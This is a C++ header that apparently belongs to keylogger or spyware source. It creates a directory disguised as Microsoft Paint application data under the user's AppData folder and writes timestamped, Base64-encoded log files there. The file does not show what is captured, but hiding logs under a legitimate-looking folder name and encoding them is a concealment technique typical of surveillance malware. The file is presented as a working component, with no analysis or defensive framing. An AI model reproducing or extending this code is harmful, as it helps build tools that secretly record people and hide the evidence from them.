#ifndef POCKET_IO_H
#define POCKET_IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"

#include "Helper.h"
#include "Base64.h"

using namespace std;

namespace IO{
    string getPath(const bool separator = false){
        string appdata_dir(getenv("APPDATA"));  // default is `C:\Users\USERNAME\AppData\Roaming`
        string full = appdata_dir + "\\Microsoft\\Paint";
        return full + (separator ? "\\" : "");
    }

    bool mkDir(const string& path){
        return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool mkDirRecur(string path){
        for(char &c : path){
            if(c == '\\') {
                c = '\0';
                if(!mkDir(path)) return false;
                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    string writeLog(const T &t){
        string path = getPath(true);
        Helper::DateTime dt;
        string name = dt.getDateTime("_") + ".log";

        try {
            ofstream file(path+name);
            if(!file) return "";
            ostringstream s;
            s << "[" << dt.getDateTime() << "]" << endl << t << endl;
            string data = Base64::encrypt(s.str());
//            string data = s.str();
            file << data;
            if(!file) return "";
            file.close();
            return name;
        } catch(...) {
            return "";
        }
    }

}

#endif //POCKET_IO_H
